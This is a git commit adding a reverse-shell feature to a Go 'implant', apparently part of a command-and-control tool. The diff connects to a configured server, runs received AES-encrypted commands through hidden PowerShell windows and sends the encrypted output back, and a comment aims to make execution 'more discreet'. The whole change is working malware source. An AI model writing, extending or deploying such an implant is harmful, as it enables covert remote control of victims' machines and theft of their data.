c1d01c7d40c7a4d2d74e04703651b09976a6088e
winds0r <wontsleep@protonmail.com>
2023-09-25 20:08:07 +0200

    feat(implant): adding basic reverse-shell

--- implant/cmd/cli.go
+++ implant/cmd/cli.go
@@ -1,6 +1,15 @@
 package cmd
 
-import "github.com/spf13/cobra"
+import (
+	"bufio"
+	"fmt"
+	"net"
+	"os/exec"
+	"syscall"
+
+	"github.com/bogdzn/razin/server/aes"
+	"github.com/spf13/cobra"
+)
 
 type CliOptions struct {
 
@@ -38,6 +47,42 @@ func LoadServerCLI(opts *CliOptions) *cobra.Command {
 		Long:               "Executes commands on a target machine & communicates with AES",
 		Run: func(cmd *cobra.Command, args []string) {
 
+			/* set up TCP connection with server */
+			conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", opts.Address, opts.Port))
+			if err != nil {
+				panic(err)
+			}
+
+			/*
+			   From this side, we are only connected with one server, no need to account for multiple
+			   connection, so lets just keep it simple i guess...
+			*/
+			for {
+
+				/* from this side, we receive input line-by-line */
+				msg, _ := bufio.NewReader(conn).ReadString('\n')
+				decrypted := aes.AesDecrypt(msg, opts.AesKey)
+
+				if opts.DebugEnabled {
+					fmt.Printf(" ---=== [ new packet ] ===---\nReceived: %s\nTranslated: %s\n\n", msg, decrypted)
+				}
+
+				/* TODO: improve the call to powershell to something more discreet lol */
+				cmd := exec.Command("powershell", decrypted)
+				cmd.SysProcAttr = &syscall.SysProcAttr{
+					HideWindow: true,
+				}
+
+				/* retrieve output or error & send it back! */
+				out, err := cmd.Output()
+				if err != nil {
+					fmt.Fprint(conn, aes.EncryptAes("command failure:\n", opts.AesKey))
+					fmt.Fprint(conn, aes.EncryptAes(err.Error(), opts.AesKey))
+				} else {
+
+					fmt.Fprint(conn, aes.EncryptAes(string(out), opts.AesKey)+"\n")
+				}
+			}
 		},
 	}
 
